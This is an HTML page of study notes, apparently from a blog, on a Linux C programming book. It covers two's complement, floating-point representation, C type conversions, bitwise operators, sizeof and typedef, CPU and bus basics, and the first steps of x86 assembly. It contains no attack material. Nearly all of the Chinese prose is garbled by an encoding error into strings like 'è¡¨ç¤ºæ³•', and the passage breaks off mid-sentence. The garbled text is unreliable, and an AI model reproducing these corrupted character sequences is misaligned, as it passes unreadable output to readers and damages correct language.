è¡¨ç¤ºæ³•</h3><p>æŠŠæœ€é«˜ä½è§„å®šä¸ºç¬¦å·ä½ (Sign Bit), 0 è¡¨ç¤ºæ­£ 1 è¡¨ç¤ºè´Ÿ.</p><p>è®¡ç®—æœºåšåŠ æ³•è¿ç®—éœ€è¦å¤„ç†çš„é€»è¾‘:</p><ul><li>å¦‚æœä¸¤æ•°ç¬¦å·ä½ç›¸åŒ, å°±æŠŠä»–ä»¬çš„ä½ä¸ƒä½ç›¸åŠ </li><li>å¦‚æœä¸¤æ•°ç¬¦å·ä½ä¸åŒ, é¦–å…ˆæ¯”è¾ƒå®ƒä»¬çš„ä½ä¸ƒä½è°å¤§, ç„¶åç”¨å¤§æ•°å‡å°æ•°, ç»“æœçš„ç¬¦å·ä½å’Œå¤§æ•°ç›¸åŒ</li></ul><h3 id="13-3-2-1â€™s-Complement-è¡¨ç¤ºæ³•"><a href="#13-3-2-1â€™s-Complement-è¡¨ç¤ºæ³•" class="headerlink" title="13.3.2 1â€™s Complement è¡¨ç¤ºæ³•"></a>13.3.2 1â€™s Complement è¡¨ç¤ºæ³•</h3><p>è´Ÿæ•°ç”¨ 1 çš„è¡¥ç  (1â€™s Complement) è¡¨ç¤º, å‡æ³•è½¬æ¢æˆåŠ æ³•, è®¡ç®—ç»“æœçš„æœ€é«˜ä½å¦‚æœæœ‰è¿›ä½åˆ™è¦åŠ å›åˆ°æœ€ä½ä½ä¸Šå».</p><p>å– 1 çš„è¡¥ç å°±æ˜¯æŠŠæ¯ä¸ªä½å–å, æ‰€ä»¥ 1 çš„è¡¥ç ä¹Ÿè¢«ç§°ä¸ºåç .</p><h3 id="13-3-3-2â€™s-Complement-è¡¨ç¤ºæ³•"><a href="#13-3-3-2â€™s-Complement-è¡¨ç¤ºæ³•" class="headerlink" title="13.3.3 2â€™s Complement è¡¨ç¤ºæ³•"></a>13.3.3 2â€™s Complement è¡¨ç¤ºæ³•</h3><p>2â€™s Complement è¡¨ç¤ºæ³•è§„å®š: æ­£æ•°ä¸å˜, è´Ÿæ•°å…ˆå–åç å†åŠ  1.</p><p>æ„æ€æ˜¯, å¦‚æœæˆ‘æƒ³è¦è¡¨ç¤º -4, é‚£æˆ‘å°±è¦æŠŠ 0100 æ‹¿å‡ºæ¥, å– 0100 çš„ 2 çš„è¡¥ç , å³ 1111 - 0100 + 1 &#x3D; 10000 - 0100. å³ä» $2^4$ é‡Œå‡å» 4.</p><p>å…¶è®¡ç®—è§„åˆ™ä¸º: å‡æ³•è½¬æ¢æˆåŠ æ³•, å¿½ç•¥è®¡ç®—ç»“æœæœ€é«˜ä½çš„è¿›ä½, ä¸å¿…åŠ å›åˆ°æœ€ä½ä½ä¸Šå».</p><p>è¿™é‡Œçš„ç²¾é«“å°±æ˜¯è¦èˆå¼ƒæœ€é«˜ä½çš„è¿›ä½.</p><h3 id="13-3-4-æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°"><a href="#13-3-4-æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°" class="headerlink" title="13.3.4 æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°"></a>13.3.4 æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°</h3><p>è®¡ç®—æœºåšåŠ æ³•æ—¶å¹¶ä¸åŒºåˆ†æ“ä½œæ•°æ˜¯æœ‰ç¬¦å·æ•°è¿˜æ˜¯æ— ç¬¦å·æ•°, è®¡ç®—è¿‡ç¨‹éƒ½ä¸€æ ·.</p><p>æ³¨æ„è¿›ä½æ ‡å¿—å’Œæº¢å‡ºæ ‡å¿—.</p><h2 id="13-4-æµ®ç‚¹æ•°"><a href="#13-4-æµ®ç‚¹æ•°" class="headerlink" title="13.4 æµ®ç‚¹æ•°"></a>13.4 æµ®ç‚¹æ•°</h2><p>æµ®ç‚¹æ•°åœ¨è®¡ç®—æœºä¸­çš„è¡¨ç¤ºæ˜¯åŸºäºç§‘å­¦è®¡æ•°æ³• (Scientific Notation).</p><p>32767 è¿™ä¸ªæ•°ç”¨ç§‘å­¦è®¡æ•°æ³•å¯ä»¥å†™æˆ $3.2767x10^4$, 3.2767 ç§°ä¸ºå°¾æ•°  (Mantissa, æˆ–ç€å« Significand), 4 ç§°ä¸ºæŒ‡æ•° (Exponent).</p><p>æµ®ç‚¹æ•°åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:</p><ul><li>ç¬¦å·ä½</li><li>æŒ‡æ•°éƒ¨åˆ†</li><li>å°¾æ•°éƒ¨åˆ†, è¿™é‡Œè¦å°†æ‰€æœ‰æœ‰æ•ˆä½æ•°éƒ½ç§»åˆ°å°æ•°ç‚¹å</li></ul><p>æŒ‡æ•°éƒ¨åˆ†çš„è¡¨ç¤ºé‡‡ç”¨ <mark>åç§»çš„æŒ‡æ•°</mark> (Biased Exponent), è§„å®šä¸€ä¸ªåç§»å€¼, å¦‚ 16, å®é™…çš„æŒ‡æ•°å°±è¦åŠ ä¸Šè¿™ä¸ªåç§»å€¼å†å†™å…¥åˆ°æŒ‡æ•°éƒ¨åˆ†, è¿™æ ·, æ¯” 16 å°å°±è¯´æ˜æŒ‡æ•°ä¸ºè´Ÿæ•°, æ¯” 16å¤§å°±è¯´æ˜æŒ‡æ•°ä¸ºæ­£æ•°.</p><p>ä¸ºäº†è§£å†³æ¯ä¸ªæµ®ç‚¹æ•°çš„è¡¨ç¤ºä¸å”¯ä¸€çš„é—®é¢˜, è§„å®šå°¾æ•°éƒ¨åˆ†çš„æœ€é«˜ä½å¿…é¡»æ˜¯ä¸€. è¿™ä¸ª 1 ä¸å¿…ä¿å­˜åœ¨å°¾æ•°ä¸­, å› ä¸ºæœ€é«˜ä½éƒ½æ˜¯ 1.</p><p>åšæµ®ç‚¹è¿ç®—æ—¶è¦æ³¨æ„ç²¾åº¦æŸå¤±é—®é¢˜. æœ‰æ—¶è®¡ç®—é¡ºåºä¸åŒä¹Ÿä¼šå¯¼è‡´ç»“æœä¸åŒ.</p><p>æ•´æ•°è¿ç®—ä¼šäº§ç”Ÿæº¢å‡º, æµ®ç‚¹è¿ç®—ä¹Ÿä¼šäº§ç”Ÿæº¢å‡º, æµ®ç‚¹è¿ç®—çš„æº¢å‡ºä¹Ÿåˆ†ä¸Šæº¢å’Œä¸‹æº¢, ä½†å’Œæ•´æ•°è¿ç®—çš„å®šä¹‰ä¸åŒ.</p><h1 id="ç¬¬14ç« -æ•°æ®ç±»å‹è¯¦è§£"><a href="#ç¬¬14ç« -æ•°æ®ç±»å‹è¯¦è§£" class="headerlink" title="ç¬¬14ç«  æ•°æ®ç±»å‹è¯¦è§£"></a>ç¬¬14ç«  æ•°æ®ç±»å‹è¯¦è§£</h1><p>C è¯­è¨€ä¸å¹³å°å’Œç¼–è¯‘å™¨æ˜¯å¯†ä¸å¯åˆ†çš„.</p><p>ILP32 è¿™ä¸ªç¼©å†™çš„æ„æ€æ˜¯ int (I), long (L), å’ŒæŒ‡é’ˆ (P) ç±»å‹éƒ½å  32ä½.</p><p>æŒ‡é’ˆç±»å‹çš„é•¿åº¦æ€»æ˜¯å’Œè®¡ç®—æœºçš„ä½æ•°ä¸€ç›´.</p><p>åœ¨ x86 å¹³å°ä¸Š int å’Œ long çš„å–å€¼èŒƒå›´ç›¸åŒ.</p><h2 id="14-2-æµ®ç‚¹å‹"><a href="#14-2-æµ®ç‚¹å‹" class="headerlink" title="14.2 æµ®ç‚¹å‹"></a>14.2 æµ®ç‚¹å‹</h2><p>æµ®ç‚¹æ•°çš„å®ç°åœ¨å„ç§å¹³å°ä¸Šå·®å¼‚å¾ˆå¤§.</p><h2 id="14-3-ç±»å‹è½¬æ¢"><a href="#14-3-ç±»å‹è½¬æ¢" class="headerlink" title="14.3 ç±»å‹è½¬æ¢"></a>14.3 ç±»å‹è½¬æ¢</h2><h3 id="14-3-1-Integer-Promotion"><a href="#14-3-1-Integer-Promotion" class="headerlink" title="14.3.1 Integer Promotion"></a>14.3.1 Integer Promotion</h3><p>å¦‚æœåŸå§‹ç±»å‹çš„å–å€¼èŒƒå›´éƒ½èƒ½ç”¨ int å‹è¡¨ç¤º, åˆ™å…¶ç±»å‹è¢«æå‡ä¸º int, å¦‚æœåŸå§‹ç±»å‹çš„å–å€¼èŒƒå›´ç”¨ int å‹è¡¨ç¤ºä¸äº†, åˆ™æå‡ä¸º unsigned int å‹, è¿™è¢«ç§°ä½œ Integer Promotion.</p><h3 id="14-3-2-Usual-Arithmetic-Conversion"><a href="#14-3-2-Usual-Arithmetic-Conversion" class="headerlink" title="14.3.2 Usual Arithmetic Conversion"></a>14.3.2 Usual Arithmetic Conversion</h3><p>ä¸¤ä¸ªç®—æ•°ç±»å‹çš„æ“ä½œæ•°åšç®—æ•°è¿ç®—, æ¯”å¦‚ a + b, å¦‚æœä¸¤è¾¹æ“ä½œæ•°çš„ç±»å‹ä¸åŒ, ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åšç±»å‹è½¬æ¢, ä½¿ä¸¤è¾¹ç±»å‹ç›¸åŒä¹‹åå†åšè¿ç®—, è¿™è¢«ç§°ä¸º Usual Arithmetic Conversion.</p><p>æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°æ··ç”¨ä¼šå¾ˆéº»çƒ¦.</p><h3 id="14-3-3-ç”±èµ‹å€¼äº§ç”Ÿçš„ç±»å‹è½¬æ¢"><a href="#14-3-3-ç”±èµ‹å€¼äº§ç”Ÿçš„ç±»å‹è½¬æ¢" class="headerlink" title="14.3.3 ç”±èµ‹å€¼äº§ç”Ÿçš„ç±»å‹è½¬æ¢"></a>14.3.3 ç”±èµ‹å€¼äº§ç”Ÿçš„ç±»å‹è½¬æ¢</h3><h3 id="14-3-4-å¼ºåˆ¶ç±»å‹è½¬æ¢"><a href="#14-3-4-å¼ºåˆ¶ç±»å‹è½¬æ¢" class="headerlink" title="14.3.4 å¼ºåˆ¶ç±»å‹è½¬æ¢"></a>14.3.4 å¼ºåˆ¶ç±»å‹è½¬æ¢</h3><h3 id="14-3-5-ç¼–è¯‘å™¨å¦‚ä½•å¤„ç†ç±»å‹è½¬æ¢"><a href="#14-3-5-ç¼–è¯‘å™¨å¦‚ä½•å¤„ç†ç±»å‹è½¬æ¢" class="headerlink" title="14.3.5 ç¼–è¯‘å™¨å¦‚ä½•å¤„ç†ç±»å‹è½¬æ¢"></a>14.3.5 ç¼–è¯‘å™¨å¦‚ä½•å¤„ç†ç±»å‹è½¬æ¢</h3><h1 id="ç¬¬15ç« -è¿ç®—ç¬¦è¯¦è§£"><a href="#ç¬¬15ç« -è¿ç®—ç¬¦è¯¦è§£" class="headerlink" title="ç¬¬15ç«  è¿ç®—ç¬¦è¯¦è§£"></a>ç¬¬15ç«  è¿ç®—ç¬¦è¯¦è§£</h1><h2 id="15-1-ä½è¿ç®—"><a href="#15-1-ä½è¿ç®—" class="headerlink" title="15.1 ä½è¿ç®—"></a>15.1 ä½è¿ç®—</h2><h3 id="15-1-1-æŒ‰ä½ä¸-æˆ–-å¼‚æˆ–-å–åè¿ç®—"><a href="#15-1-1-æŒ‰ä½ä¸-æˆ–-å¼‚æˆ–-å–åè¿ç®—" class="headerlink" title="15.1.1 æŒ‰ä½ä¸, æˆ–, å¼‚æˆ–, å–åè¿ç®—"></a>15.1.1 æŒ‰ä½ä¸, æˆ–, å¼‚æˆ–, å–åè¿ç®—</h3><p>&amp;, |, ^ è¿ç®—ç¬¦éƒ½æ˜¯è¦åš Usual Arithmetic Conversion çš„ (å…¶ä¸­æœ‰ä¸€æ­¥æ˜¯ Integer Promotion), ~ è¿ç®—ç¬¦ä¹Ÿè¦åš Integer Promotion, æ‰€ä»¥åœ¨ C è¯­è¨€ä¸­å…¶å®å¹¶ä¸å­˜åœ¨ 8 ä½æ•´æ•°çš„ä½è¿ç®—, æ“ä½œæ•°åœ¨åšä½è¿ç®—ä¹‹å‰éƒ½è‡³å°‘è¢«æå‡ä¸º int å‹äº†.</p><h3 id="15-1-2-ç§»ä½è¿ç®—"><a href="#15-1-2-ç§»ä½è¿ç®—" class="headerlink" title="15.1.2 ç§»ä½è¿ç®—"></a>15.1.2 ç§»ä½è¿ç®—</h3><p>åœ¨ä¸€å®šçš„å–å€¼èŒƒå›´å†…, å°†ä¸€ä¸ªæ•´æ•°å·¦ç§» 1 ä½ç›¸å½“äºä¹˜ä»¥ 2.</p><p>ç”±äºè®¡ç®—æœºåšç§»ä½æ¯”ä¹˜æ³•å¿«å¾—å¤š, ç¼–è¯‘å™¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è¿›è¡Œä¼˜åŒ–.</p><p>å½“æ“ä½œæ•°æ˜¯æœ‰ç¬¦å·æ•°æ—¶, å³ç§»è¿ç®—çš„è§„åˆ™æ¯”è¾ƒå¤æ‚.</p><p>å»ºè®®åªå¯¹æ— ç¬¦å·æ•°åšä½è¿ç®—, ä»¥å‡å°‘å‡ºé”™çš„å¯èƒ½æ€§.</p><h3 id="15-1-3-æ©ç "><a href="#15-1-3-æ©ç " class="headerlink" title="15.1.3 æ©ç "></a>15.1.3 æ©ç </h3><p>ç”¨äºå¯¹ä¸€ä¸ªæ•´æ•°ä¸­çš„æŸäº›ä½è¿›è¡Œæ“ä½œ.</p><h3 id="15-1-4-å¼‚æˆ–è¿ç®—çš„ä¸€äº›ç‰¹æ€§"><a href="#15-1-4-å¼‚æˆ–è¿ç®—çš„ä¸€äº›ç‰¹æ€§" class="headerlink" title="15.1.4 å¼‚æˆ–è¿ç®—çš„ä¸€äº›ç‰¹æ€§"></a>15.1.4 å¼‚æˆ–è¿ç®—çš„ä¸€äº›ç‰¹æ€§</h3><ul><li>ä¸€ä¸ªæ•°å’Œè‡ªå·±åšå¼‚æˆ–çš„ç»“æœæ˜¯ 0</li></ul><h2 id="15-2-å…¶ä»–è¿ç®—ç¬¦"><a href="#15-2-å…¶ä»–è¿ç®—ç¬¦" class="headerlink" title="15.2 å…¶ä»–è¿ç®—ç¬¦"></a>15.2 å…¶ä»–è¿ç®—ç¬¦</h2><p><code>a += 1</code> å’Œ <code>a = a + 1</code>, å‰è€…å¯¹è¡¨è¾¾å¼ a åªæ±‚å€¼ä¸€æ¬¡, è€Œåè€…æ±‚å€¼ä¸¤æ¬¡.</p><p><code>++i</code> ç›¸å½“äº <code>i += 1</code>, åªæ±‚å€¼ä¸€æ¬¡.</p><h3 id="15-2-4-sizeof-è¿ç®—ç¬¦ä¸-typedef-ç±»å‹å£°æ˜"><a href="#15-2-4-sizeof-è¿ç®—ç¬¦ä¸-typedef-ç±»å‹å£°æ˜" class="headerlink" title="15.2.4 sizeof è¿ç®—ç¬¦ä¸ typedef ç±»å‹å£°æ˜"></a>15.2.4 sizeof è¿ç®—ç¬¦ä¸ typedef ç±»å‹å£°æ˜</h3><p><code>sizeof è¡¨è¾¾å¼</code> ä¸­çš„å­è¡¨è¾¾å¼ä¸æ±‚å€¼, å¦‚ <code>sizeof(i++)</code> ä¸­ <code>i</code> ä¹Ÿä¸ä¼šé€’å¢.</p><p>sizeof è¿ç®—ç¬¦çš„ç»“æœæ˜¯ size_t ç±»å‹, è¿™ä¸ªç±»å‹å®šä¹‰åœ¨ stddef.h å¤´æ–‡ä»¶ä¸­.</p><p>æ ‡å‡† C è§„å®š size_t æ˜¯ä¸€ç§æ— ç¬¦å·æ•´å‹:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">size_t</span>;<br></code></pre></td></tr></table></figure><p>typedef çš„ä¾‹å­:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> <span class="hljs-type">array_t</span>[<span class="hljs-number">10</span>];<br><span class="hljs-type">array_t</span> a;<br></code></pre></td></tr></table></figure><p>è¿™ç›¸å½“äºå£°æ˜ <code>char a[10]</code>.</p><h1 id="ç¬¬16ç« -è®¡ç®—æœºä½“ç³»æœºæ„åŸºç¡€"><a href="#ç¬¬16ç« -è®¡ç®—æœºä½“ç³»æœºæ„åŸºç¡€" class="headerlink" title="ç¬¬16ç«  è®¡ç®—æœºä½“ç³»æœºæ„åŸºç¡€"></a>ç¬¬16ç«  è®¡ç®—æœºä½“ç³»æœºæ„åŸºç¡€</h1><p>Von Neumann ä½“ç³»ç»“æ„çš„ä¸»è¦ç‰¹ç‚¹: CPU (Central Processsing Unit, ä¸­å¤®å¤„ç†å™¨, æˆ–ç®€ç§°å¤„ç†å™¨ Processor) å’Œå†…å­˜ (Memory) æ˜¯è®¡ç®—æœºçš„ä¸¤ä¸ªä¸»è¦ç»„æˆéƒ¨åˆ†, å†…å­˜ä¸­ä¿å­˜ç€æ•°æ®å’ŒæŒ‡ä»¤, CPU ä»å†…å­˜ä¸­å–æŒ‡ä»¤ (Fetch) æ‰§è¡Œ, å…¶ä¸­æœ‰äº›æŒ‡ä»¤è®© CPU åšè¿ç®—, æœ‰äº›æŒ‡ä»¤è®© CPU è¯»å†™å†…å­˜ä¸­çš„æ•°æ®.</p><p>ä¸€ä¸ªåœ°å€æ‰€å¯¹åº”çš„å†…å­˜å•å…ƒåªèƒ½å­˜ä¸€ä¸ªå­—èŠ‚.</p><h2 id="16-2-CPU"><a href="#16-2-CPU" class="headerlink" title="16.2 CPU"></a>16.2 CPU</h2><p>CPU æœ€æ ¸å¿ƒçš„åŠŸèƒ½å•å…ƒåŒ…æ‹¬ä»¥ä¸‹å‡ éƒ¨åˆ†:</p><ul><li>å¯„å­˜å™¨ (Register)</li><li>ç¨‹åºè®¡æ•°å™¨ (Program Counte), æ˜¯ä¸€ç§ç‰¹æ®Šçš„å¯„å­˜å™¨, ä¿å­˜ç€ CPU å–ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€.</li><li>æŒ‡ä»¤è¯‘ç å™¨ (Intruction Decoder)</li><li>ç®—æ•°é€»è¾‘å•å…ƒ (Arithmetic and Logic, ALU)</li><li>åœ°å€å’Œæ•°æ®æ€»çº¿ (Bus)</li></ul><p>åœ°å€çº¿, æ•°æ®çº¿å’Œ CPU å¯„å­˜å™¨çš„ä½æ•°é€šå¸¸æ˜¯ä¸€è‡´çš„.</p><p>å†…æ€»çº¿ç»è¿‡ MMU å’Œæ€»çº¿æ¥å£çš„è½¬æ¢ä¹‹åå¼•å‡ºåˆ°èŠ¯ç‰‡å¼•è„šæ‰æ˜¯å¤–æ€»çº¿, å¤–åœ°å€çº¿å’Œå¤–æ•°æ®çº¿çš„ä½æ•°éƒ½æœ‰å¯èƒ½å’Œå†…æ€»çº¿ä¸åŒ.</p><h2 id="16-3-è®¾å¤‡"><a href="#16-3-è®¾å¤‡" class="headerlink" title="16.3 è®¾å¤‡"></a>16.3 è®¾å¤‡</h2><p>æ­£å› ä¸ºåœ°å€çº¿å’Œæ•°æ®çº¿ä¸Šå¯ä»¥æŒ‚å¤šä¸ªè®¾å¤‡å’Œå†…å­˜èŠ¯ç‰‡æ‰€ä»¥æ‰å« â€œæ€»çº¿â€. ä½†ä¸åŒè®¾å¤‡å’Œå†…å­˜èŠ¯ç‰‡åº”è¯¥å ç”¨ä¸åŒçš„åœ°å€èŒƒå›´.</p><p>è®¾å¤‡ä¸­å¯ä¾›è¯»å†™è®¿é—®çš„å•å…ƒé€šå¸¸ç§°ä¸ºè®¾å¤‡å¯„å­˜å™¨. æ“ä½œè®¾å¤‡çš„è¿‡ç¨‹å°±æ˜¯è¯»å†™è¿™äº›è®¾å¤‡å¯„å­˜å™¨çš„è¿‡ç¨‹.</p><p>x86 å¯¹äºè®¾å¤‡æœ‰ç‹¬ç«‹çš„ç«¯å£åœ°å€ç©ºé—´, CPU æ ¸éœ€è¦å¼•å‡ºé¢å¤–çš„åœ°å€çº¿æ¥è¿æ¥ç‰‡å†…è®¾å¤‡ (å’Œè®¿é—®å†…å­˜æ‰€ç”¨çš„åœ°å€çº¿ä¸åŒ).</p><p>ä» CPU çš„è§’åº¦æ¥çœ‹, è®¿é—®è®¾å¤‡åªæœ‰å†…å­˜æ˜ å°„ I&#x2F;O å’Œç«¯å£ I&#x2F;O ä¸¤ç§.</p><p>ä¸€ä¸ªæ“ä½œç³»ç»Ÿä¸ºäº†æ”¯æŒå¹¿æ³›çš„è®¾å¤‡å°±éœ€è¦æœ‰å¤§é‡çš„è®¾å¤‡é©±åŠ¨ç¨‹åº, äº‹å®ä¸Š Linux å†…æ ¸æºä»£ç ä¸­ç»å¤§éƒ¨åˆ†æ˜¯è®¾å¤‡é©±åŠ¨ç¨‹åº, è®¾å¤‡é©±åŠ¨ç¨‹åºé€šå¸¸æ˜¯å†…æ ¸é‡Œçš„ä¸€ç»„å‡½æ•°, é€šè¿‡è¯»å†™è®¾å¤‡å¯„å­˜å™¨å®ç°å¯¹è®¾å¤‡çš„åˆå§‹åŒ–, è¯», å†™ç­‰æ“ä½œ, æœ‰äº›è®¾å¤‡è¿˜è¦æä¾›ä¸€ä¸ªä¸­æ–­å¤„ç†å‡½æ•°ä¾› ISR è°ƒç”¨.</p><h2 id="16-4-MMU"><a href="#16-4-MMU" class="headerlink" title="16.4 MMU"></a>16.4 MMU</h2><h1 id="ç¬¬17ç« -x86æ±‡ç¼–ç¨‹åºåŸºç¡€"><a href="#ç¬¬17ç« -x86æ±‡ç¼–ç¨‹åºåŸºç¡€" class="headerlink" title="ç¬¬17ç«  x86æ±‡ç¼–ç¨‹åºåŸºç¡€"></a>ç¬¬17ç«  x86æ±‡ç¼–ç¨‹åºåŸºç¡€</h1><p>ç”Ÿæˆäº†ç›®æ ‡æ–‡ä»¶ä¹‹åè¿˜æ˜¯æ— æ³•æ‰§è¡Œ, è™½ç„¶ç›®æ ‡æ–‡ä»¶å·²ç»æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶äº†.</p><p>é“¾æ¥ä¸»è¦æœ‰ä¸¤ä¸ªä½œç”¨:</p><ul><li>ä¿®æ”¹ç›®æ ‡æ–‡ä»¶ä¸­çš„ä¿¡æ¯, å¯¹åœ°å€åšé‡å®šä½</li><li>æŠŠå¤šä¸ªç›®æ ‡æ–‡ä»¶åˆå¹¶æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</li></ul><p><code>#</code> è¡¨ç¤ºå•è¡Œæ³¨é‡Š.</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">.section .<span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure><p>æ±‡ç¼–ç¨‹åºä¸­ä»¥ <code>.</code> å¼€å¤´çš„åç§°å¹¶ä¸æ˜¯æŒ‡ä»¤çš„åŠ©è®°ç¬¦, ä¸ä¼šè¢«ç¿»è¯‘æˆæœºå™¨æŒ‡ä»¤, è€Œæ˜¯ç»™æ±‡ç¼–å™¨ä¸€äº›ç‰¹æ®ŠæŒ‡ç¤º, ç§°ä¸ºæ±‡ç¼–æŒ‡ç¤º (Assembler Directive) æˆ–ä¼ªæ“ä½œ (Pseudo-operation), ç”±äºå®ƒä¸æ˜¯çœŸæ­£çš„æŒ‡ä»¤æ‰€ä»¥åŠ ä¸ª â€œä¼ªâ€ å­—.</p><p><code>.section</code> æŒ‡ç¤ºæŠŠä»£ç åˆ’åˆ†æˆè‹¥å¹²ä¸ªæ®µ (Section). ç¨‹åºè¢«æ“ä½œç³»ç»ŸåŠ è½½æ—¶, æ¯ä¸ªæ®µè¢«åŠ è½½åˆ°ä¸åŒçš„åœ°å€, æ“ä½œç³»ç»Ÿå¯¹ä¸åŒçš„é¡µé¢è®¾ç½®ä¸åŒçš„è¯», å†™, æ‰§è¡Œæƒé™. æ„Ÿè§‰åƒæ˜¯ç”¨æ¥å£°æ˜ä¸€ä¸ªæ®µ.</p><p><code>.data</code> æ®µä¿å­˜ç¨‹åºçš„æ•°æ®, æ˜¯å¯è¯»å¯å†™çš„, ç›¸å½“äº C ç¨‹åºçš„å…¨å±€å˜é‡, è¿™é‡Œæ²¡æœ‰å®šä¹‰æ•°æ®, æ‰€ä»¥ <code>.data</code> æ®µæ˜¯ç©ºçš„.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.section</span> <span class="hljs-string">.text</span><br></code></pre></td></tr></table></figure><p><code>.text</code> æ®µä¿å­˜ä»£ç , æ˜¯åªè¯»å’Œå¯æ‰§è¡Œçš„, åé¢é‚£äº›æŒ‡ä»¤éƒ½æ˜¯å±äº <code>.text</code> æ®µ.</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.globl _start</span><br></code></pre></td></tr></table></figure><p><code>_start</code> æ˜¯ä¸€ä¸ªç¬¦å· (Symble), ç¬¦å·åœ¨æ±‡ç¼–ç¨‹åºä¸­ä»£è¡¨ä¸€ä¸ªåœ°å€.</p><p>åœ¨ C è¯­è¨€ä¸­æˆ‘ä»¬é€šè¿‡å˜é‡åè®¿é—®ä¸€ä¸ªå˜é‡, å…¶å®å°±æ˜¯æ˜¯è¯»å†™ä»æŸä¸ªåœ°å€å¼€å§‹çš„å†…å­˜å•å…ƒ, æˆ‘ä»¬é€šè¿‡å‡½æ•°åè°ƒç”¨ä¸€ä¸ªå‡½æ•°, å…¶å®å°±æ˜¯è·³è½¬åˆ°è¯¥å‡½æ•°ç¬¬ä¸€æ¡æŒ‡ä»¤æ‰€åœ¨çš„åœ°å€, æ‰€ä»¥å˜é‡åå’Œå‡½æ•°åéƒ½æ˜¯ç¬¦å·, æœ¬è´¨ä¸Šæ˜¯ä»£è¡¨å†…å­˜åœ°å€çš„.</p><p><code>.globl</code> å‘Šè¯‰æ±‡ç¼–å™¨, <code>_start</code> è¿™ä¸ªç¬¦å·è¦è¢«é“¾æ¥å™¨ç”¨åˆ°, æ‰€ä»¥è¦åœ¨ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­æ ‡è®°å®ƒæ˜¯ä¸€ä¸ªå…¨å±€ç¬¦å·.</p><p><code>_start</code> å°±åƒ C ç¨‹åºçš„ main å‡½æ•°ä¸€æ ·ç‰¹æ®Š, æ˜¯æ•´ä¸ªç¨‹åºçš„å…¥å£, è¿™é‡Œåªèƒ½æ˜¯ <code>_start</code>, ä¸èƒ½å†™æˆå…¶ä»–çš„, è¿æ¥å™¨åœ¨é“¾æ¥æ—¶ä¼šæŸ¥æ‰¾ç›®æ ‡æ–‡ä»¶ä¸­ <code>_start</code> ç¬¦å·ä»£è¡¨çš„åœ°å€, æŠŠå®ƒè®¾ç½®ä¸ºæ•´ä¸ªç¨‹åºçš„å…¥å£åœ°å€, æ‰€ä»¥æ¯ä¸ªæ±‡ç¼–ç¨‹åºéƒ½è¦æä¾›ä¸€ä¸ª <code>_start</code>  ç¬¦å·å¹¶ä¸”ç”¨ <code>.globl</code> å£°æ˜, å¦‚æœä¸€ä¸ªç¬¦å·æ²¡æœ‰ç”¨ <code>.global</code> å£°æ˜, å°±è¡¨ç¤ºè¿™ä¸ªç¬¦å·ä¸ä¼šè¢«é“¾æ¥å™¨ç”¨åˆ°.</p><p><code>_start:</code></p><p>è¿™é‡Œå®šä¹‰äº† <code>_start</code> ç¬¦å·, æ±‡ç¼–å™¨åœ¨ç¿»è¯‘æ±‡ç¼–ç¨‹åºæ—¶ä¼šè®¡ç®—æ¯ä¸ªæ•°æ®å¯¹è±¡å’Œæ¯æ¡æŒ‡ä»¤çš„åœ°å€, å½“çœ‹åˆ°è¿™æ ·ä¸€ä¸ªç¬¦å·å®šä¹‰æ—¶, å°±æŠŠä»–åé¢ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ä½œä¸ºè¿™ä¸ªç¬¦å·æ‰€ä»£è¡¨çš„åœ°å€.</p><p><code>movl $1, %eax</code></p><p>è¿™æ¡æŒ‡ä»¤ä¸è¦æ±‚ CPU è¯»å†…å­˜, 1 è¿™ä¸ªæ•°æ˜¯åœ¨ CPU å†…éƒ¨äº§ç”Ÿçš„, ç§°ä¸ºç«‹å³æ•° (Immediate).</p><p>åœ¨æ±‡ç¼–ç¨‹åºä¸­, ç«‹å³æ•°å‰é¢è¦åŠ  <code>$</code>, å¯„å­˜å™¨åå‰é¢è¦åŠ  <code>%</code>.</p><p>Linux çš„å„ç§ç³»ç»Ÿè°ƒç”¨éƒ½æ˜¯ç”± <code>int $0x80</code> æŒ‡ä»¤å¼•å‘çš„.</p><p><code>int</code> æŒ‡ä»¤ç§°ä¸ºè½¯ä¸­æ–­æŒ‡ä»¤, å¯ä»¥ç”¨è¿™æ¡æŒ‡ä»¤æ•…æ„äº§ç”Ÿä¸€ä¸ªå¼‚å¸¸, å¼‚å¸¸çš„å¤„ç†å’Œä¸­æ–­ç±»ä¼¼, CPU ä»ç”¨æˆ·æ¨¡å¼åˆ‡æ¢ä¸ºå†…æ ¸æ¨¡å¼, ç„¶åè·³è½¬åˆ°å†…å’Œä»£ç ä¸­æ‰§è¡Œå¼‚å¸¸å¤„ç†ç¨‹åº.</p><p><code>int</code> æŒ‡ä»¤ä¸­çš„ç«‹å³æ•° <code>0X80</code> æ˜¯ä¸€ä¸ªå‚æ•°, åœ¨å¼‚å¸¸å¤„ç†ç¨‹åºä¸­è¦æ ¹æ®è¿™ä¸ªå‚æ•°å†³å®šå¦‚ä½•å¤„ç†, 